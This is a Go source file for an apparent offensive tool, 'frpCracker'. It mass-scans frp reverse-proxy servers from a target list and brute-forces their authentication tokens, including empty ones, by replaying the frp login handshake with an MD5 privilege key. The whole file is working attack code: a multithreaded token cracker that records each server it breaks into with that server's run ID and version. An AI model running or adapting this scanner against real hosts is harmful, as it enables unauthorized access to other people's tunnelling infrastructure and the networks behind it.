package main

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"frpCracker/common"
	"net"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

func GetAuthKey(token string, timestamp int64) (key string) {
	md5Ctx := md5.New()
	md5Ctx.Write([]byte(token))
	md5Ctx.Write([]byte(strconv.FormatInt(timestamp, 10)))
	data := md5Ctx.Sum(nil)
	return hex.EncodeToString(data)
}

func WrapperTcpWithTimeout(network, address string, timeout time.Duration) (net.Conn, error) {
	d := &net.Dialer{Timeout: timeout}
	return WrapperTCP(network, address, d)
}

func WrapperTCP(network, address string, forward *net.Dialer) (net.Conn, error) {
	//get conn
	var conn net.Conn
	var err error
	conn, err = forward.Dial(network, address)
	if err != nil {
		return nil, err
	}
	return conn, nil

}

func getAuthMsg(version string, os string, arch string, token string) []byte {
	tm := time.Now().Unix()
	head := "\x6f\x00\x00\x00\x00\x00\x00\x00"
	jsonString := `{"version":"` + version + `","os":"` + os + `","arch":"` + arch + `","privilege_key":"` + GetAuthKey(token, tm) + `","timestamp":` + strconv.FormatInt(tm, 10) + `,"pool_count":1}`
	lenJson := byte(len(jsonString))
	result := []byte(head)
	result = append(result, lenJson)
	return []byte(string(result) + jsonString)

}

func connectToFRPs(ipPort string, token string) int {
	client, err := WrapperTcpWithTimeout("tcp", ipPort, 10*time.Second)
	defer func() {
		if client != nil {
			client.Close()
		}
	}()
	if err != nil {
		return 1
	}
	err = client.SetDeadline(time.Now().Add(10 * time.Second))
	if err != nil {
		return 1
	}

	_, err = client.Write([]byte("\x00\x01\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00"))
	if err != nil {
		return 1
	}

	rev := make([]byte, 1024)
	_, errRead := client.Read(rev)
	if errRead != nil {
		return 1
	}
	if string(rev[:4]) != "\x00\x01\x00\x02" {
		return 1
	}

	authMsg := getAuthMsg(common.ClientVersion, "windows", "amd64", token)
	_, err = client.Write([]byte("\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x94"))
	if err != nil {
		return 2
	}
	_, err = client.Write(authMsg)
	if err != nil {
		return 2
	}
	rev = make([]byte, 1024)
	_, errRead = client.Read(rev)
	if errRead != nil {
		return 2
	}

	rev2 := make([]byte, 1024)
	_, errRead = client.Read(rev2)
	if errRead != nil {
		return 2
	}

	t := "Token: " + token
	if token == "" {
		t = "Unauthorized"
	}
	resultText := "[+] frp://" + ipPort + " " + t + "\n"

	reRunID := regexp.MustCompile("\"run_id\":\"(.*?)\"")
	runIDResult := reRunID.FindAllStringSubmatch(string(rev2), -1)
	runID := ""
	for _, v := range runIDResult {
		if len(v) != 2 {
			continue
		}
		resultText = resultText + "      - RunID:" + v[1] + "\n"
		runID = v[1]
	}

	if strings.Contains(string(rev2), "\"version\":\"") && runID != "" {

		re := regexp.MustCompile("\"version\":\"(.*?)\"")
		verResult := re.FindAllStringSubmatch(string(rev2), -1)
		for _, v := range verResult {
			if len(v) != 2 {
				continue
			}
			resultText = resultText + "      - Server version:" + v[1] + "\n"
		}

		common.WriteResult(resultText)

		return 0

	}

	return 3

}

func cracker() {
	if common.InputTargetsFileName == "" {
		fmt.Println("[-] 程序无输入，即将退出。")
		return
	}
	var tokenList []string
	var ipPortList []string

	inputByte, err := os.ReadFile(common.InputTargetsFileName)
	if err == nil {
		for _, v := range strings.Split(string(inputByte), "\n") {
			ipPortList = append(ipPortList, strings.ReplaceAll(v, "\r", ""))
		}
	}

	if len(ipPortList) == 0 {
		fmt.Println("[-] 程序无输入，即将退出。")
		return
	}

	tokenList = append(tokenList, "")
	if common.TokenFileName != "" {
		inputBytesToken, errToken := os.ReadFile(common.TokenFileName)
		if errToken == nil {
			for _, v := range strings.Split(string(inputBytesToken), "\n") {
				tokenList = append(tokenList, strings.ReplaceAll(v, "\r", ""))
			}
		}
	}

	workers := common.Threads
	ipPortChan := make(chan string, len(ipPortList))
	defer close(ipPortChan)
	var wg sync.WaitGroup

	//多线程扫描
	for i := 0; i < workers; i++ {
		go func() {
			for ipPort := range ipPortChan {
				for _, v := range tokenList {
					ret := connectToFRPs(ipPort, v)
					if ret != 3 {
						break
					}
				}
				wg.Done()
			}

		}()
	}

	//添加扫描目标
	for _, ipPort := range ipPortList {
		wg.Add(1)
		ipPortChan <- ipPort
	}
	wg.Wait()

	fmt.Println("done!")
}

func main() {
	common.Flag()
	cracker()
}
